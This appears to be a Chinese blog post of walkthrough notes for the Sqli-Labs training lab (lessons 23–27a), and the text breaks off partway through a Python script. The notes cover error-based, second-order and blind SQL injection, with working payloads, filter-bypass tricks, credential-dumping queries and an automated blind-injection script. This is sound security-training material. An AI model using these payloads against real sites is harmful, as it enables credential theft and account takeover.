<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Sqli-Labs笔记-Advanced"><meta name="keywords" content="Web,Sql注入"><meta name="author" content="Gard3nia"><meta name="copyright" content="Gard3nia"><title>Sqli-Labs笔记-Advanced | Gard3nia's Notebook</title><link rel="shortcut icon" href="/rea.jpg"><link rel="stylesheet" href="/css/index.css?version=1.5.6"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.5.6"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-number">1.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#less-23-报错注入-过滤注释"><span class="toc-number">1.1.</span> <span class="toc-text">less-23(报错注入+过滤注释)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-24-二次注入"><span class="toc-number">1.2.</span> <span class="toc-text">less-24(二次注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#为什么在主页不能实现直接注入？"><span class="toc-number">1.2.1.</span> <span class="toc-text">为什么在主页不能实现直接注入？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#为什么注册页面不可以直接注入？"><span class="toc-number">1.2.2.</span> <span class="toc-text">为什么注册页面不可以直接注入？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#为什么注册功能可以成功写入特殊字符？"><span class="toc-number">1.2.3.</span> <span class="toc-text">为什么注册功能可以成功写入特殊字符？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是二次注入"><span class="toc-number">1.2.4.</span> <span class="toc-text">什么是二次注入?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-25-and-or过滤，字符型"><span class="toc-number">1.3.</span> <span class="toc-text">less-25(and/or过滤，字符型)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-25a-and-or过滤，数字型，blind"><span class="toc-number">1.4.</span> <span class="toc-text">less-25a(and/or过滤，数字型，blind)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-26-空格-注释过滤，字符型"><span class="toc-number">1.5.</span> <span class="toc-text">less-26(空格/注释过滤，字符型)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-26a-空格-注释过滤，字符型，blind"><span class="toc-number">1.6.</span> <span class="toc-text">less-26a(空格/注释过滤，字符型，blind)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-27-select-union绕过，字符型"><span class="toc-number">1.7.</span> <span class="toc-text">less-27(select/union绕过，字符型)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-27a-select-union绕过-字符型"><span class="toc-number">1.8.</span> <span class="toc-text">less-27a(select/union绕过,字符型)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-28-union-空字符-select绕过-字符型"><span class="toc-number">1.9.</span> <span class="toc-text">less-28(union+空字符+select绕过,字符型)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less28-a"><span class="toc-number">1.10.</span> <span class="toc-text">less28-a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-29-HTTP参数污染"><span class="toc-number">1.11.</span> <span class="toc-text">less-29(HTTP参数污染)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-30"><span class="toc-number">1.12.</span> <span class="toc-text">less-30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-31"><span class="toc-number">1.13.</span> <span class="toc-text">less-31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-32-宽字节注入"><span class="toc-number">1.14.</span> <span class="toc-text">less-32(宽字节注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#how-to-solve"><span class="toc-number">1.14.1.</span> <span class="toc-text">how to solve \</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-33"><span class="toc-number">1.15.</span> <span class="toc-text">less-33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-34"><span class="toc-number">1.16.</span> <span class="toc-text">less-34</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gard3nia</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">34</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">21</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">10</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">friendlinks</div><a class="author-info-links__name text-center" href="https://skysec.top">一叶飘零学长</a><a class="author-info-links__name text-center" href="https://0verwatch.top/">0verwatch</a><a class="author-info-links__name text-center" href="http://chaosec.top/">瑞雪师傅</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://s2.ax1x.com/2019/05/26/VE5mHf.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gard3nia's Notebook</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">时间轴</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">归档</a><a class="site-page" href="/about">简介</a></span></div><div id="post-info"><div id="post-title">Sqli-Labs笔记-Advanced</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-07</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/靶场通关笔记/">靶场通关笔记</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">3.4k</span><span class="post-meta__separator">|</span><span>Reading time: 15 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="less-23-报错注入-过滤注释"><a href="#less-23-报错注入-过滤注释" class="headerlink" title="less-23(报错注入+过滤注释)"></a>less-23(报错注入+过滤注释)</h2><p>拿到手先试一下单引号，报错，以为很简单，但是想到已经是进阶版的注入，在尝试了注释掉后面内容以后发现一直在报错，果然没那么简单……在尝试完所有的注释符号后我发现……可能是过滤掉了注释符号……</p>
<p>尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<p>成功闭合，所以下面就是常规操作…</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<p>查看源码：</p>
<p>过滤函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br></pre></td></tr></table></figure>
<p>有print出来error，所以允许报错注入：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff"&gt;'</span>;	</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="less-24-二次注入"><a href="#less-24-二次注入" class="headerlink" title="less-24(二次注入)"></a>less-24(二次注入)</h2><p>上来是个登录界面，有注册和修改密码功能，先注册一个新账号，登录后发现<code>YOU ARE LOGGED IN</code>字样，第一次登陆还需要修改密码；此题的目的应该是冒充admin用户登录。</p>
<p>三个核心功能：登录，注册，修改密码，一个个看；</p>
<p><img src="https://s2.ax1x.com/2019/05/29/Vu0n3t.png" alt="Vu0n3t.png"></p>
<p>退出登录寻找注入点，这里的目的应该是要用admin用户的身份登录；在登录界面随手尝试；尝试万能密码 <code>admin&#39; or &#39;1&#39;=&#39;1</code>发现不可以，那应该就是过滤了其中的一些字符集，注入点应该不在这个页面；最后发现是一个二次注入的题目；</p>
<h3 id="为什么在主页不能实现直接注入？"><a href="#为什么在主页不能实现直接注入？" class="headerlink" title="为什么在主页不能实现直接注入？"></a>为什么在主页不能实现直接注入？</h3><p>在<strong>login.php</strong>中对输入的参数进行了特殊字符转义</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   $username = mysql_real_escape_string($_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">   $password = mysql_real_escape_string($_POST[<span class="string">"login_password"</span>]);</span><br><span class="line">   $sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line"><span class="comment">//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";</span></span><br><span class="line">   $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be real smart, Try harder!!!! :( '</span>);</span><br><span class="line">   $row = mysql_fetch_row($res);</span><br><span class="line">	<span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> ($row[<span class="number">1</span>]) &#123;</span><br><span class="line">			<span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>mysql_real_escape_string</code> 转义 <code>SQL</code> 语句中使用的字符串中的特殊字符，所以此时是不可以直接在登录页上进行注入的；那就要寻找其他注入点，</p>
<h3 id="为什么注册页面不可以直接注入？"><a href="#为什么注册页面不可以直接注入？" class="headerlink" title="为什么注册页面不可以直接注入？"></a>为什么注册页面不可以直接注入？</h3><p>可利用部分没有查询语句，只有插入语句……</p>
<h3 id="为什么注册功能可以成功写入特殊字符？"><a href="#为什么注册功能可以成功写入特殊字符？" class="headerlink" title="为什么注册功能可以成功写入特殊字符？"></a>为什么注册功能可以成功写入特殊字符？</h3><p>本题还有两个链接，一个是忘记密码（没什么luan用，还有一张极为不爽的图），还有一个就是注册用户，拿出注册的源码来看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username=  mysql_escape_string($_POST[&apos;username&apos;]) ;</span><br><span class="line">$pass= mysql_escape_string($_POST[&apos;password&apos;]);</span><br><span class="line">$re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]);</span><br></pre></td></tr></table></figure>
<p>这里对输入的账户和密码进行了特殊字符转义处理，即在特殊字符前面加上<code>\</code>，但是在加上转义符号以后，写入数据库时，写入进去的数据是没有<code>\</code>的，如下所示：</p>
<p><img src="https://i.loli.net/2019/06/29/5d175163534d483323.png" alt=""></p>
<p>插入时<code>&#39;</code>是带了转义符号的，但是插入以后查询却显示没有转义符号，所以这就给二次注入留下了机会；</p>
<h3 id="什么是二次注入"><a href="#什么是二次注入" class="headerlink" title="什么是二次注入?"></a>什么是二次注入?</h3><blockquote>
<p>二次注入也称为存储型注入，就是将可能导致 SQL 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发 SQL 注入。</p>
</blockquote>
<p>1.这里我们创建新账户<code>admin&#39;#</code>，虽然在写入时<code>#</code>会被转义，但是写入数据库里的还是原来的符号，并没有添加转义符号，所以这里可以成功写入用户名<code>admin&#39;#</code>；</p>
<p>2.我们拿<code>admin&#39;#</code>用户登录，看到回显的是修改密码的页面，</p>
<p><img src="https://i.loli.net/2019/06/29/5d1750f8ef7d942666.png" alt=""></p>
<p>审计修改密码的源码，发现：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$username= $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">$curr_pass= mysql_real_escape_string($_POST[<span class="string">'current_password'</span>]);</span><br><span class="line">$pass= mysql_real_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$re_pass= mysql_real_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br></pre></td></tr></table></figure>
<p><code>username</code>没有做任何过滤和转义，这里的session里的用户名就是当前维持会话的用户<code>admin#</code>，</p>
<p>3.寻找注入点：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br></pre></td></tr></table></figure>
<p>这里输入的<code>username</code>为<code>admin#</code>会直接将后面的内容注释掉，所以形成的最后的语句就是：</p>
<p><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></p>
<p>此时就会将真的<code>admin</code>用户的密码修改为这里的<code>$pass</code>，这样的话就可以直接拿修改密码后的<code>admin</code>用户来登录，拿到<code>admin</code>的账户了；</p>
<p><img src="https://i.loli.net/2019/06/29/5d1751fd4924141073.png" alt=""></p>
<h2 id="less-25-and-or过滤，字符型"><a href="#less-25-and-or过滤，字符型" class="headerlink" title="less-25(and/or过滤，字符型)"></a>less-25(and/or过滤，字符型)</h2><p>初步测试发现是单引号字符型注入，继续测试，从hint发现<code>and</code>和<code>or</code>都被过滤了，尝试双写，绕过成功…也可以使用<code>||和&amp;&amp;</code>绕过</p>
<p><img src="https://i.loli.net/2019/06/29/5d175ee7c64cb28731.png" alt=""></p>
<p>具体的绕过方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.&amp;&amp; ||</span><br><span class="line">2.大小写变形Or,OR,oR</span><br><span class="line">3.编码，例如hex，urlencode</span><br><span class="line">4.添加注释/*or*/</span><br><span class="line">5.利用符号and=&amp;&amp; or=||</span><br><span class="line">6.双写绕过</span><br></pre></td></tr></table></figure>
<p>接下来就是常规操作</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(username),group_concat(passwoorrd) from users--+</span><br></pre></td></tr></table></figure>
<p>也可报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; %26%26 updatexml(1,concat(0x7e,database(),0x7e),1)--+</span><br></pre></td></tr></table></figure>
<p>查看源码危险的过滤函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);			//strip out OR (non case sensitive)</span><br><span class="line">	$id= preg_replace(&apos;/AND/i&apos;,&quot;&quot;, $id);		//Strip out AND (non case sensitive)</span><br><span class="line">	</span><br><span class="line">	return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="less-25a-and-or过滤，数字型，blind"><a href="#less-25a-and-or过滤，数字型，blind" class="headerlink" title="less-25a(and/or过滤，数字型，blind)"></a>less-25a(and/or过滤，数字型，blind)</h2><p>初步测试发现为数字型注入，过滤掉了<code>and</code>和<code>or</code>，双写绕过……</p>
<p><img src="https://i.loli.net/2019/06/29/5d175fbff327831362.png" alt=""></p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(username),group_concat(passwoorrd) from users</span><br></pre></td></tr></table></figure>
<h2 id="less-26-空格-注释过滤，字符型"><a href="#less-26-空格-注释过滤，字符型" class="headerlink" title="less-26(空格/注释过滤，字符型)"></a>less-26(空格/注释过滤，字符型)</h2><p>fuzz半天没出来，直接查看源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);			//strip out OR (non case sensitive)</span><br><span class="line">	$id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);		//Strip out AND (non case sensitive)</span><br><span class="line">	$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);		//strip out /*</span><br><span class="line">	$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);		//Strip out --</span><br><span class="line">	$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);			//Strip out #</span><br><span class="line">	$id= preg_replace(&apos;/[\s]/&apos;,&quot;&quot;, $id);		//Strip out spaces</span><br><span class="line">	$id= preg_replace(&apos;/[\/\\\\]/&apos;,&quot;&quot;, $id);		//Strip out slashes</span><br><span class="line">	return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤掉了…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or and /* -- # 空格  \ /</span><br></pre></td></tr></table></figure>
<p>过滤掉注释符号只有一种办法解决，那就是构造如下语句闭合句末的引号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<p>过滤掉空格是一件非常头疼的事情，下面重点探讨一下空格的绕过方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB 键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return 功能</span><br><span class="line">%0b TAB 键（垂直）</span><br><span class="line">%a0 空格</span><br><span class="line">%20 urlencode</span><br><span class="line">/**/ 注释</span><br></pre></td></tr></table></figure>
<p>这里使用<code>%a0</code>来绕过</p>
<p>报错注入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27%a0%26%26%a0updatexml(1,concat(0x7e,database(),0x7e),1)%a0||%271%27=%271</span><br></pre></td></tr></table></figure>
<h2 id="less-26a-空格-注释过滤，字符型，blind"><a href="#less-26a-空格-注释过滤，字符型，blind" class="headerlink" title="less-26a(空格/注释过滤，字符型，blind)"></a>less-26a(空格/注释过滤，字符型，blind)</h2><p>这题对比26的区别就是不能报错注入，那就直接盲注吧，直接上盲注脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://127.0.0.1/sqli-labs/Less-26a/"</span></span><br><span class="line">payload=<span class="string">"?id=1')%a0aandnd%a0ascii(substr(database(),&#123;len&#125;,1))=&#123;ascii&#125;%a0%26%26%a0('1'='1"</span></span><br><span class="line">database_name=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">		url_now=url+payload.format(len=i,ascii=j)</span><br><span class="line">		r=requests.get(url_now)</span><br><span class="line">		r.encoding=r.apparent_encoding</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			database_name+=chr(j)</span><br><span class="line">print(database_name)</span><br></pre></td></tr></table></figure>
<h2 id="less-27-select-union绕过，字符型"><a href="#less-27-select-union绕过，字符型" class="headerlink" title="less-27(select/union绕过，字符型)"></a>less-27(select/union绕过，字符型)</h2><p>黑名单继续添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);		//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);		//Strip out --.</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);			//Strip out #.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);	    //Strip out union</span><br><span class="line">$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);	    //Strip out select</span><br><span class="line">$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);	    //Strip out UNION</span><br><span class="line">$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);	    //Strip out SELECT</span><br><span class="line">$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);	    //Strip out Union</span><br><span class="line">$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);	    //Strip out select</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一次直接将联合查询过滤了，查询也不能用，<code>union select</code>都过滤了，而且<code>select</code>还过滤了两次，直接双写绕过或者大小写混写即可</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27%a0uniounionn%a0selecselecselecttt%a02,(selecselecselecttt%a0group_concat(username)%a0from%a0users),4%a0||%a0%271%27=%271</span><br></pre></td></tr></table></figure>
<p>或者直接报错注入:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27and%a0updatexml(1,concat(0x7e,database(),0x7e),1)%a0and%271%27=%271</span><br></pre></td></tr></table></figure>
<h2 id="less-27a-select-union绕过-字符型"><a href="#less-27a-select-union绕过-字符型" class="headerlink" title="less-27a(select/union绕过,字符型)"></a>less-27a(select/union绕过,字符型)</h2><p>区别就是双引号</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%22%a0uniunionon%a0selecselecselecttt%a02,(selecselecselecttt%a0group_concat(password)from%a0users),4||%221%22=%221</span><br></pre></td></tr></table></figure>
<p>很久没写盲注脚本了，给出一个exp吧：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span 